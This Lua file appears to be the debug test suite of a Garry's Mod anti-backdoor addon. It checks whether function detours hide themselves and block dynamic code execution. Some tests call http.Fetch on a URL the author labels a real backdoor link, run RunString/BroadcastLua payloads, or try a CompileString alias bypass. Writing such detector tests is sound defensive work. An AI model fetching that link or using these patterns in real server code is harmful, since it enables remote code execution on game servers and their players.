--[[
    2020-2021 Xalalau Xubilozo. MIT License
    https://xalalau.com/
--]]

function BS:Debug_RunTests(args)
    local tests = {}
    tests.aux = {}

    tests.text = {
        ["detour"] = "Detour a function and call it",
        ["detour2"] = "Detour a function without calling it",
        ["getfenv"] = "Try to get our custom environment",
        ["tostring"] = "Try to check if a detoured function is valid",
        ["debug.getfenv"] = "Try to get our custom environment",
        ["http.Fetch"] = "Run a prohibited code combination",
        ["RunString"] = "Run a prohibited code combination",
        ["RunString2"] = "Run a prohibited code combination with fake function names",
        ["RunStringEx"] = "Run a prohibited code combination",
        ["debug.getinfo"] = "Try to check if a detoured function is valid",
        ["jit.util.funcinfo"] = "Try to check if a detoured function is valid",
        ["CompileFile"] = "Run a prohibited code combination",
        ["CompileString"] = "Run a prohibited code combination",
    }

    function tests.help()
        print("\n  Available tests:\n")
        for k,v in SortedPairs(tests.text) do
            print(string.format("     %-18s %s", k, v))
        end
        print("\n  Usage: bs_tests test1 test2 test3 ...\n\n  Leave empty to run all tests.")
    end

    function tests.detour()
        local bak = self.__G["timer"]["Simple"]
        print("\n-----> Detour:" .. tests.text["detour"])
        local function detour()
            bak(0, function() end)
        end
        self.__G["timer"]["Simple"] = detour
        detour()
        if self.__G["timer"]["Simple"] ~= detour then
            print(" (Pass) Detour undone.")
        else
            print(" (Fail) The detour still exists!")
            self.__G["timer"]["Simple"] = bak
        end
        print()
    end

    function tests.detour2()
        print("\n-----> Detour 2:" .. tests.text["detour2"])
        local function detourSilent() end
        self.__G["http"]["Post"] = detourSilent
        print("\n (Wainting) Detouring auto check test result pending... After some seconds: Pass = block execution; Fail = no alerts.\n")
    end

    function tests.getfenv()
        print("\n-----> getfenv: " .. tests.text["getfenv"])
        local env = self.__G.getfenv()
        if env == self.__G then
            print(" (Pass) Our custom environment is out of range.")
        else
            print(" (Fail) Our custom environment is exposed!")
        end
        print()
    end

    function tests.tostring()
        print("\n-----> tostring: " .. tests.text["tostring"] .. "\n")

        if string.find(self.__G.tostring(self.__G["jit"]["util"]["funcinfo"]), "builtin", nil, true) then
            print(" (Pass) A selected detour (jit.util.funcinfo) is invisible.")
        else
            print(" (Fail) A selected detour (jit.util.funcinfo) is visible!")
        end
        print()
    end

    function tests.aux.debuggetfenv()
        print("\n-----> debug.getfenv: " .. tests.text["debug.getfenv"])
        local function this() end
        local env = self.__G.debug.getfenv(this)
        if env == self.__G then
            print(" (Pass) Our custom environment is out of range.")
        else
            print(" (Fail) Our custom environment is exposed!")
        end
        print()
    end
    tests["debug.getfenv"] = tests.aux.debuggetfenv

    function tests.aux.httpFetch()
        print("\n-----> http.Fetch: " .. tests.text["http.Fetch"])
        self.__G.http.Fetch("http://disp0.cf/gas.lua", function (arg) -- Real backdoor link
            print("\nProhibited code is running inside http.Fetch!")
        end)
        print("\n (Waiting) http.Fetch test result pending... Pass = block execution; Fail = run and print message.\n")
    end
    tests["http.Fetch"] = tests.aux.httpFetch

    function tests.RunString()
        print("\n-----> RunString: " .. tests.text["RunString"])
        self.__G.RunString([[ BroadcastLua("print('')") print("\nProhibited code is running!")]]);
        print("\n (Result) Pass = block execution; Fail = Print a message.\n")
    end

    function tests.RunString2()
        print("\n-----> RunString 2: " .. tests.text["RunString2"])
        self.__G.CompStrBypass = self.__G.CompileString
        self.__G.RunString([[ print("\n1") local two = CompStrBypass("print(2)") if isfunction(two) then two() end print("\n3")]]);
        self.__G.CompStrBypass = nil
         print("\n (Result) Pass = 1 and 3 are visible but 2 is blocked; Fail = 1, 2 and 3 are visible.\n")
    end

    function tests.RunStringEx()
        print("\n-----> RunStringEx: " .. tests.text["RunStringEx"])
        self.__G.RunStringEx([[RunString(print("Prohibited code is running!"))]]);
        print("\n (Result) Pass = block execution; Fail = Print a message.\n")
    end

    function tests.aux.debuggetinfo()
        print("\n-----> debug.getinfo: " .. tests.text["debug.getinfo"] .. "\n")
        PrintTable(self.__G.debug.getinfo(self.__G.RunString, "flnSu"))
        print()
        if self.__G.debug.getinfo(self.__G.RunString).short_src == "[C]" then
            print(" (Pass) A selected detour (RunString) is invisible.")
        else
            print(" (Fail) A selected detour (RunString) is visible!")
        end
        print()
    end
    tests["debug.getinfo"] = tests.aux.debuggetinfo

    function tests.aux.jitutilfuncinfo()
        print("\n-----> jit.util.funcinfo: " .. tests.text["jit.util.funcinfo"] .. "\n")
        PrintTable(self.__G.jit.util.funcinfo(self.__G.debug.getinfo))
        print()
        if self.__G.jit.util.funcinfo(self.__G.debug.getinfo)["source"] == nil then
            print(" (Pass) A selected detour (debug.getinfo) is invisible.")
        else
            print(" (Fail) A selected detour (debug.getinfo) is visible!")
        end
        print()
    end
    tests["jit.util.funcinfo"] = tests.aux.jitutilfuncinfo

    function tests.CompileFile()
        print("\n-----> CompileFile: " .. tests.text["CompileFile"])
        local compFile = self.__G.CompileFile("bs/server/modules/debug.lua")
        print()
        if not compFile then
            print(" (Pass) A file full of prohibited code combinations wasn't compiled.")
        else
            print(" (Fail) A file full of prohibited code combinations was compiled!")
        end
        print()
    end

    function tests.CompileString()
        print("\n-----> CompileString: " .. tests.text["CompileString"])
        local compStr = self.__G.CompileString("RunString(MsgN('Hi))", "TestCode")
        print()
        if compStr == "" then
            print(" (Pass) A string with prohibited code combinations wasn't compiled.")
        else
            print(" (Fail) A string with prohibited code combinations was compiled!")
        end
        print()
    end

    if #args == 0 or args[1] ~= "help" then
        print("\n\n---------------------------------------------------------")
        print("[STARTING TESTS]\n")
    end

    local printDelayedMsg1 = #args == 0 and true 
    local printDelayedMsg2 = #args == 0 and true 

    if #args == 0 then
        for k,v in pairs(tests) do
            if v and isfunction(v) and v ~= tests.help then
                if v == tests["http.Fetch"] then printDelayedMsg1 = true end
                if v == tests["detour2"] then printDelayedMsg2 = true end
                v()
            end
        end
    else
        local found
        for _,testName in ipairs(args) do
            if tests[testName] then
                found = true
                tests[testName]()
            end
        end
        if not found then
            print("\n" .. testName .. "not found...\n")
            tests.help()
        end
    end

    if #args == 0 or args[1] ~= "help" then
        print("\n[FINISHED TESTS]")
        print("---------------------------------------------------------")
        print("[WAITING FOR]\n")

        if printDelayedMsg1 then
            print("--> http.Fetch test result...")
        end
        if printDelayedMsg2 then
            print("--> Detouring auto check test result...")
        end
    end
end
